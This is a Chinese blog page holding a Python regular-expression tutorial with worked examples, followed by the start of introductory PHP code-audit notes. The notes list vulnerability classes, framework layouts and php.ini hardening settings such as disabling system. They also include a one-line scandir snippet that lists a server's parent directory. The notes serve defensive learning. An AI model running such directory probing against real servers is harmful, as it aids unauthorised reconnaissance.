<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re   #第一步，要引入re模块</span><br><span class="line">&gt;&gt;&gt; result = re.findall(&quot;\S&quot;, &quot;匹配规则   这2个字符串3是否匹\n配规则5则则则7则&quot;)   #\S匹配任何非空白字符，它相当于类[^\t\n\r\f\v]	(横向制表符、换行、回车、换页、纵向制表符)</span><br><span class="line">&gt;&gt;&gt; print(result)  #以列表形式返回匹配到的字符串</span><br><span class="line">[&apos;匹&apos;, &apos;配&apos;, &apos;规&apos;, &apos;则&apos;, &apos;这&apos;, &apos;2&apos;, &apos;个&apos;, &apos;字&apos;, &apos;符&apos;, &apos;串&apos;, &apos;3&apos;, &apos;是&apos;, &apos;否&apos;, &apos;匹&apos;, &apos;配&apos;, &apos;规&apos;, &apos;则&apos;, &apos;5&apos;, &apos;则&apos;, &apos;则&apos;, &apos;则&apos;, &apos;7&apos;, &apos;则&apos;]</span><br></pre></td></tr></table></figure>

<p>\w匹配包括下划线在内任何字母数字字符，它相当于类[a-zA-Z0-9_]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re   #第一步，要引入re模块</span><br><span class="line">&gt;&gt;&gt; result = re.findall(&apos;\w&apos;,&quot;https://www.cnblogs.com/&quot;)  #\w匹配包括下划线在内任何字母数字字符，它相当于类[a-zA-Z0-9_]</span><br><span class="line">&gt;&gt;&gt; print(result)  #以列表形式返回匹配到的字符串</span><br><span class="line">[&apos;h&apos;, &apos;t&apos;, &apos;t&apos;, &apos;p&apos;, &apos;s&apos;, &apos;w&apos;, &apos;w&apos;, &apos;w&apos;, &apos;c&apos;, &apos;n&apos;, &apos;b&apos;, &apos;l&apos;, &apos;o&apos;, &apos;g&apos;, &apos;s&apos;, &apos;c&apos;, &apos;o&apos;, &apos;m&apos;]</span><br></pre></td></tr></table></figure>

<p>\W匹配非任何字母数字字符包括下划线在内，它相当于类[^a-zA-Z0-9_]</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re   #第一步，要引入re模块</span><br><span class="line">&gt;&gt;&gt; result = re.findall(&apos;\W&apos;,&quot;https://www.cnblogs.com/&quot;)  #\W不匹配包括下划线在内任何字母数字字符，它相当于类[^a-zA-Z0-9_]</span><br><span class="line">&gt;&gt;&gt; print(result)  #以列表形式返回匹配到的字符串</span><br><span class="line">[&apos;:&apos;, &apos;/&apos;, &apos;/&apos;, &apos;.&apos;, &apos;.&apos;, &apos;/&apos;]</span><br></pre></td></tr></table></figure>

<h4 id="元字符，分组"><a href="#元字符，分组" class="headerlink" title="()元字符，分组"></a>()元字符，分组</h4><p>也就是分组匹配，()里面的为一个组也可以理解成一个整体</p>
<p>如果()后面跟的是特殊元字符如   (adc)*   那么*控制的前导字符就是()里的整体内容，不再是前导一个字符</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re   #第一步，要引入re模块</span><br><span class="line">#也就是分组匹配，()里面的为一个组也可以理解成一个整体</span><br><span class="line">&gt;&gt;&gt; result = re.search(&quot;(a4)+&quot;, &quot;a4a4a4a4a4dg4g654gb&quot;)   #匹配一个或多个a4</span><br><span class="line">&gt;&gt;&gt; result1 = result.group()</span><br><span class="line">&gt;&gt;&gt; print(result1)</span><br><span class="line">a4a4a4a4a4</span><br><span class="line">&gt;&gt;&gt; result = re.search(&quot;a(\d+)&quot;,&quot;a45646148a49a4a456048a45gg&quot;)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">&lt;re.Match object; span=(0, 9), match=&apos;a45646148&apos;&gt;</span><br><span class="line">&gt;&gt;&gt; result1 = result.group()</span><br><span class="line">&gt;&gt;&gt; print(result1)</span><br><span class="line">a45646148</span><br></pre></td></tr></table></figure>

<h4 id="元字符，或"><a href="#元字符，或" class="headerlink" title="|元字符，或"></a>|元字符，或</h4><p>|或，或就是前后其中一个符合就匹配</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re   #第一步，要引入re模块</span><br><span class="line">&gt;&gt;&gt; result = re.findall(r&quot;你|好&quot;, &quot;a4a4a你4aabc4a4dgg好dg4g654g&quot;)   #|或，或就是前后其中一个符合就匹配</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">[&apos;你&apos;, &apos;好&apos;]</span><br><span class="line">&gt;&gt;&gt; result = re.findall(r&quot;a4a4a你|好dg4g654&quot;,&quot;a4a4a你4aabc4a4dgg好dg4g654g&quot;)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">[&apos;a4a4a你&apos;, &apos;好dg4g654&apos;]</span><br></pre></td></tr></table></figure>

<h4 id="r原生字符"><a href="#r原生字符" class="headerlink" title="r原生字符"></a>r原生字符</h4><p>将在python里有特殊意义的字符如\b，转换成原生字符（就是去除它在python的特殊意义），不然会给正则表达式有冲突，为了避免这种冲突可以在规则前加原始字符r</p>
<p>(这里还有点问题，结果不太懂，为啥第一个不输出 [a\b] )</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; import re   #第一步，要引入re模块</span><br><span class="line">&gt;&gt;&gt; result = re.findall(r&quot;a\b&quot;,&quot;welcoma\b&quot;)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">[&apos;a&apos;]</span><br><span class="line">&gt;&gt;&gt; result = re.findall(&quot;a\b&quot;,&quot;welcoma\b&quot;)</span><br><span class="line">&gt;&gt;&gt; print(result)</span><br><span class="line">[&apos;a\x08&apos;]</span><br></pre></td></tr></table></figure>

<h3 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h3><p>result = re.method(“rule”,string)</p>
<h4 id="1-match-方法-从字符串头部开始匹配"><a href="#1-match-方法-从字符串头部开始匹配" class="headerlink" title="1. match()方法, 从字符串头部开始匹配"></a>1. match()方法, 从字符串头部开始匹配</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">content = <span class="string">'The 123456 is my one phone number.'</span></span><br><span class="line">print(len(content)) <span class="comment">#字符串长度</span></span><br><span class="line">result = re.match(<span class="string">r'^The\s\d+\s\w*'</span>, content) <span class="comment">#使用match匹配, 第一个参数为正则表达式, 第二个为要匹配的字符串</span></span><br><span class="line">print(result)</span><br><span class="line">print(result.group()) <span class="comment">#输出匹配内容</span></span><br><span class="line">print(result.span()) <span class="comment">#输出匹配内容的位置索引</span></span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">34</span><br><span class="line">&lt;_sre.SRE_Match object; span=(0, 13), match=&apos;The 123456 is&apos;&gt;</span><br><span class="line">The 123456 is</span><br><span class="line">(0, 13)</span><br></pre></td></tr></table></figure>

<h4 id="2-匹配目标"><a href="#2-匹配目标" class="headerlink" title="2. 匹配目标"></a>2. 匹配目标</h4><p>在正则表达式中用()括起来可以使用group()输出, 若有n个(), 那么可以表示为group(n), 输出第n个括号匹配的内容.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">content = &apos;The 123456 is my one phone number.&apos;</span><br><span class="line">print(len(content)) #字符串长度</span><br><span class="line">result = re.match(r&apos;^The\s(\d+)\sis&apos;, content) #使用match匹配, 第一个参数为正则表达式, 第二个为要匹配的字符串</span><br><span class="line">print(result)</span><br><span class="line">print(result.group()) #输出匹配内容</span><br><span class="line">print(result.group(1)) #输出第一个被()包裹的内容</span><br><span class="line">print(result.span()) #输出匹配内容的位置索引</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">34</span><br><span class="line">&lt;_sre.SRE_Match object; span=(0, 13), match=&apos;The 123456 is&apos;&gt;</span><br><span class="line">The 123456 is</span><br><span class="line">123456</span><br><span class="line">(0, 13)</span><br></pre></td></tr></table></figure>

<h4 id="3-通用匹配"><a href="#3-通用匹配" class="headerlink" title="3.通用匹配"></a>3.通用匹配</h4><p>. 表示匹配任意字符, *表示匹配前面字符无限次.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">content = &apos;The 123456 is my one phone number.&apos;</span><br><span class="line">result = re.match(r&apos;^The.*number.$&apos;, content) #使用match匹配, 第一个参数为正则表达式, 第二个为要匹配的字符串</span><br><span class="line">print(result)</span><br><span class="line">print(result.group()) #输出匹配内容</span><br><span class="line">print(result.span()) #输出匹配内容的位置索引</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;_sre.SRE_Match object; span=(0, 34), match=&apos;The 123456 is my one phone number.&apos;&gt;</span><br><span class="line">The 123456 is my one phone number.</span><br><span class="line">(0, 34)</span><br></pre></td></tr></table></figure>

<h4 id="4-贪婪与非贪婪"><a href="#4-贪婪与非贪婪" class="headerlink" title="4.贪婪与非贪婪"></a>4.贪婪与非贪婪</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">content = &apos;The 123456 is my one phone number.&apos;</span><br><span class="line">print(&apos;贪婪匹配:&apos;)</span><br><span class="line">result = re.match(r&apos;^The.*(\d+).*&apos;, content) #使用match匹配, 第一个参数为正则表达式, 第二个为要匹配的字符串</span><br><span class="line">print(result.group()) #输出匹配内容</span><br><span class="line">print(&apos;result = %s&apos;%result.group(1)) #输出第一个被()包裹的内容</span><br><span class="line">print(&apos;-&apos;*20)</span><br><span class="line">print(&apos;非贪婪匹配:&apos;)</span><br><span class="line">result = re.match(r&apos;^The.*?(\d+).*&apos;, content) </span><br><span class="line">print(result.group())</span><br><span class="line">print(&apos;result = %s&apos;%result.group(1))</span><br><span class="line">print(&apos;-&apos;*20)</span><br><span class="line">result = re.match(r&apos;^The.*?(\d+).*?&apos;, content)</span><br><span class="line">print(result.group())</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">贪婪匹配:</span><br><span class="line">The 123456 is my one phone number.</span><br><span class="line">result = 6</span><br><span class="line">--------------------</span><br><span class="line">非贪婪匹配:</span><br><span class="line">The 123456 is my one phone number.</span><br><span class="line">result = 123456</span><br><span class="line">--------------------</span><br><span class="line">The 123456</span><br></pre></td></tr></table></figure>

<h4 id="5-修饰符-re-S"><a href="#5-修饰符-re-S" class="headerlink" title="5.修饰符 re.S"></a>5.修饰符 re.S</h4><p>由于加上re.S参数后, 通配符 . 将可以匹配换行符, 所以result不为空, result2为空。除了re.S, 还有许多修饰符如, </p>
<p>re.I: 使用匹配时忽略大小写。（大写的i）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">content = &apos;&apos;&apos;The 123456 is</span><br><span class="line">one of my phone.</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">result = re.match(&apos;^The.*?(\d+).*?phone.&apos;, content, re.S)</span><br><span class="line">if result:</span><br><span class="line">    print(result.group(1))</span><br><span class="line">else:</span><br><span class="line">    print(&apos;result = None&apos;)</span><br><span class="line">result2 = re.match(&apos;^The.*?(\d+).*?phone.&apos;, content)</span><br><span class="line">if result2:</span><br><span class="line">    print(result2.group(1))</span><br><span class="line">else:</span><br><span class="line">    print(&apos;result2 = None&apos;)</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">123456</span><br><span class="line">result2 = None</span><br></pre></td></tr></table></figure>

<h4 id="6-转义匹配"><a href="#6-转义匹配" class="headerlink" title="6.转义匹配"></a>6.转义匹配</h4><p>由于()属于正则表达式的特殊字符, 因此在需要匹配()时, 需要加上转义字符’’.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">content = &apos;(百度)www.baidu.com&apos;</span><br><span class="line">result = re.match(&apos;(百度)www.baidu.com&apos;, content)</span><br><span class="line">result2 = re.match(&apos;\(百度\)www\.baidu\.com&apos;, content)</span><br><span class="line">if result:</span><br><span class="line">    print(result.group())</span><br><span class="line">else:</span><br><span class="line">    print(&apos;result = None&apos;)</span><br><span class="line">if result2:</span><br><span class="line">    print(result2.group())</span><br><span class="line">else:</span><br><span class="line">    print(&apos;result2 = None&apos;)</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">result = None</span><br><span class="line">(百度)www.baidu.com</span><br></pre></td></tr></table></figure>

<h4 id="7-search-方法-与match-方法不同-不需要从头部开始匹配"><a href="#7-search-方法-与match-方法不同-不需要从头部开始匹配" class="headerlink" title="7.search()方法, 与match()方法不同, 不需要从头部开始匹配"></a>7.search()方法, 与match()方法不同, 不需要从头部开始匹配</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">content = &apos;Other The 123456 is my one phone number.&apos;</span><br><span class="line">result = re.search(&apos;The.*?(\d+).*?number.&apos;, content)</span><br><span class="line">print(result.group())</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The 123456 is my one phone number.</span><br></pre></td></tr></table></figure>

<h4 id="8-findall-方法"><a href="#8-findall-方法" class="headerlink" title="8.findall()方法"></a>8.findall()方法</h4><p>match()和search()都是返回匹配到的第一个内容就结束匹配, findall()是返回所有符合匹配规则的内容</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">html = &apos;&apos;&apos;</span><br><span class="line">&lt;div id=&quot;songs-list&quot;&gt;</span><br><span class="line">&lt;h2 class=&quot;title&quot;&gt;歌单&lt;/h2&gt;</span><br><span class="line">&lt;p class=&quot;introduction&quot;&gt;歌单列表&lt;/p&gt;</span><br><span class="line">&lt;ul id=&quot;list&quot; class=&quot;list-group&quot;&gt;</span><br><span class="line">&lt;li data-view=&quot;2&quot;&gt;一路上有你&lt;/li&gt;</span><br><span class="line">&lt;li data-view=&quot;7&quot;&gt;</span><br><span class="line">&lt;a href=&quot;/2.mp3&quot; singer=&quot;任贤齐&quot;&gt;沧海一声笑&lt;/a&gt;</span><br><span class="line">&lt;/li&gt;</span><br><span class="line">&lt;li data-view=&quot;4&quot; class=&quot;active&quot;&gt;</span><br><span class="line">&lt;a href=&quot;/3.mp3&quot; singer=&quot;齐秦&quot;&gt;往事随风&lt;/a&gt;</span><br><span class="line">&lt;/li&gt;</span><br><span class="line">&lt;li data-view=&quot;6&quot;&gt;&lt;a href=&quot;/4.mp3&quot; singer=&quot;beyond&quot;&gt;光辉岁月&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;li data-view=&quot;5&quot;&gt;&lt;a href=&quot;/5.mp3&quot; singer=&quot;程慧玲&quot;&gt;记事本&lt;/a&gt;&lt;/li&gt;</span><br><span class="line">&lt;li data-veiw=&quot;5&quot;&gt;</span><br><span class="line">&lt;a href=&quot;/6.mp3&quot; singer=&quot;邓丽君&quot;&gt;但愿人长久&lt;/a&gt;</span><br><span class="line">&lt;/li&gt;</span><br><span class="line">&lt;/ul&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">result = re.findall(&apos;&lt;li.*?href=&quot;(.*?)&quot;.*?singer=&quot;(.*?)&quot;&gt;(.*?)&lt;/a&gt;&apos;, html, re.S)</span><br><span class="line">if result:</span><br><span class="line">    print(result)</span><br><span class="line">    for res in result:</span><br><span class="line">        print(res[0], res[1], res[2])</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[(&apos;/2.mp3&apos;, &apos;任贤齐&apos;, &apos;沧海一声笑&apos;), (&apos;/3.mp3&apos;, &apos;齐秦&apos;, &apos;往事随风&apos;), (&apos;/4.mp3&apos;, &apos;beyond&apos;, &apos;光辉岁月&apos;), (&apos;/5.mp3&apos;, &apos;程慧玲&apos;, &apos;记事本&apos;), (&apos;/6.mp3&apos;, &apos;邓丽君&apos;, &apos;但愿人长久&apos;)]</span><br><span class="line">/2.mp3 任贤齐 沧海一声笑</span><br><span class="line">/3.mp3 齐秦 往事随风</span><br><span class="line">/4.mp3 beyond 光辉岁月</span><br><span class="line">/5.mp3 程慧玲 记事本</span><br><span class="line">/6.mp3 邓丽君 但愿人长久</span><br></pre></td></tr></table></figure>

<h4 id="9-sub-方法-去除匹配的字符"><a href="#9-sub-方法-去除匹配的字符" class="headerlink" title="9.sub()方法, 去除匹配的字符"></a>9.sub()方法, 去除匹配的字符</h4><p>第二个参数是两个’，表示吧’\d+‘ 匹配的内容替换成空，如果写sub(’\d+’, ‘?’), 则把匹配的内容替换成 ?。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">content = &apos;54abc59de335f7778888g&apos;</span><br><span class="line">result = re.sub(&apos;\d+&apos;, &apos;&apos;, content)</span><br><span class="line">print(result)</span><br><span class="line">result = re.sub(&apos;\d&apos;, &apos;?&apos;, content)</span><br><span class="line">print(result)</span><br><span class="line">result = re.sub(&apos;\d+&apos;, &apos;?&apos;, content)</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">abcdefg</span><br><span class="line">??abc??de???f???????g</span><br><span class="line">?abc?de?f?g</span><br></pre></td></tr></table></figure>

<p>有点像replace，但是多一个正则关系匹配</p>
<h4 id="10-compile"><a href="#10-compile" class="headerlink" title="10.compile()"></a>10.compile()</h4><p>在需要匹配相同正则表达式情况下, 事先定义一个compile可以简化代码量, 同时compile中也可以使用修饰符re.S等.</p>
<p>( 其实也可以直接a=rule，然后 result = re.findall(a,string) ,但是这样子就不能用修饰符re.S了)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import re</span><br><span class="line"></span><br><span class="line">content1 = &apos;2016-1-1 12:01&apos;</span><br><span class="line">content2 = &apos;2017-1-1 12:02&apos;</span><br><span class="line">content3 = &apos;2018-1-1 12:03&apos;</span><br><span class="line"></span><br><span class="line">pattern = re.compile(&apos;\d&#123;2&#125;:\d&#123;2&#125;&apos;)</span><br><span class="line">result1 = re.sub(pattern, &apos;&apos;, content1)</span><br><span class="line">result2 = re.sub(pattern, &apos;&apos;, content2)</span><br><span class="line">result3 = re.sub(pattern, &apos;&apos;, content3)</span><br><span class="line">print(result1, result2, result3)</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2016-1-1  2017-1-1  2018-1-1</span><br></pre></td></tr></table></figure>

<p>附一手去除列表空元素的方法：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mytest = [i for i in test if i != &apos;&apos;]</span><br></pre></td></tr></table></figure>

<h3 id="番外"><a href="#番外" class="headerlink" title="番外"></a>番外</h3><p>这里记一下从从Li4n0学长脚本中发现的字符表替换函数：<strong>maketrans()</strong></p>
<p>语法：str.maketrans(intab, outtab)</p>
<p>参数：</p>
<p>intab – 字符串中要替代的字符组成的字符串</p>
<p>outtab – 相应的映射字符的字符串。</p>
<p>配合str.translate使用</p>
<p>实例</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">intab = &quot;aeiou&quot;</span><br><span class="line">outtab = &quot;4310U&quot;</span><br><span class="line">transtab = str.maketrans(intab, outtab)</span><br><span class="line"></span><br><span class="line">content = &quot;this is string example....wow!!!&quot;</span><br><span class="line">print (content.translate(transtab))</span><br></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">th1s 1s str1ng 3x4mpl3....w0w!!!</span><br></pre></td></tr></table></figure>

<hr>
<p>参考资料：</p>
<p><a href="https://blog.csdn.net/qq_38038143/article/details/80671420" target="_blank" rel="noopener">https://blog.csdn.net/qq_38038143/article/details/80671420</a></p>
<p><a href="https://www.cnblogs.com/zjltt/p/6955965.html" target="_blank" rel="noopener">https://www.cnblogs.com/zjltt/p/6955965.html</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/18/代码审计基础入门笔记/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="V">
      <meta itemprop="description" content>
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="V's blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/07/18/代码审计基础入门笔记/" itemprop="url">代码审计基入门笔记</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-07-18T14:46:35+08:00">
                2019-07-18
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h1 id="代码审计基础入门笔记"><a href="#代码审计基础入门笔记" class="headerlink" title="代码审计基础入门笔记"></a>代码审计基础入门笔记</h1><h3 id="审计大致方向、思路"><a href="#审计大致方向、思路" class="headerlink" title="审计大致方向、思路"></a>审计大致方向、思路</h3><p>注入</p>
<p>文件上传</p>
<p>跨站</p>
<p>程序异常处理</p>
<p>MVC架构：</p>
<p>Model：数据逻辑部分</p>
<p>View：处理数据显示的部分，显示数据</p>
<p>Controller：应用程序中处理用户交互的部分</p>
<p>常见php框架</p>
<p>先看手册、架构，安全过滤机制，</p>
<p>ThinkPHP</p>
<p>Yaf</p>
<p>Laravel</p>
<p>Kohana</p>
<p>Codelgniter</p>
<p>Yii</p>
<p>Smyfony</p>
<p>doitphp</p>
<p>处理流程</p>
<p>获取请求、<strong>全局过滤</strong>、模块文件、C函数内容、M函数内容、V显示</p>
<p>网站目录结构</p>
<p>主目录</p>
<p>模块目录</p>
<p>插件目录</p>
<p>上传目录</p>
<p>模块目录</p>
<p>数据目录</p>
<p>配置目录</p>
<p>配置文件</p>
<p>公共函数文件</p>
<p>安全过滤文件</p>
<p>数据库结构</p>
<p>入口文件</p>
<p>通读原文：函数集文件、配置文件（config.php）、安全过滤文件（lib.php）、index文件</p>
<p>敏感关键字回溯参数？</p>
<p>查找可控变量（高明的黑客）</p>
<p>功能点定向审计</p>
<p>程序安装、文件上传、文件管理、登录验证、备份恢复、找回密码</p>
<p>一切输入都是有害的</p>
<p>一切进入函数的变量都是有害的（危险函数）</p>
<h3 id="php-ini"><a href="#php-ini" class="headerlink" title="php.ini"></a>php.ini</h3><p>安全模式，safe_mode = off 【5.4.0后被移除】</p>
<p>禁用函数，disable_function = system</p>
<p>com组件,com.allow_dcom = false</p>
<p>全局变量注册开关 register_globals = Off    (使用$_GET[‘name’]来获取数据)</p>
<p>【为On时，POST或GET，都将自动使用全局变量的值来接受值】</p>
<p>魔术引号自动过滤： magic_quotes_gpc = on 开启时把单引号、双引号、反斜杠、和NULL加上反斜杠“\”进行转义，影响GET、POST、Cookies。开启以提高安全性，【5.4.0后被移除】</p>
<p>是否允许包含远程文件 allow_url_inlude = off</p>
<p>是否允许打开远程文件 allow_url_open = on</p>
<p>目录权限</p>
<p>HTTP头部版本信息泄露PHP版  expose_php = off</p>
<p>文件上传临时目录  upload_tmp_dir = （不设定则采用系统的临时目录）</p>
<p>用户可访问目录  open_basedir = E:\Local Test\WWW  (限制脚本的活动区域)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(dirname(path: __FILE__.&quot;./../&quot;)))(上层目录)</span><br></pre></td></tr></table></figure>

<p>内部错误选项   display_errors = on (调试时开启，发布后关闭，避免爆出物理地址)</p>
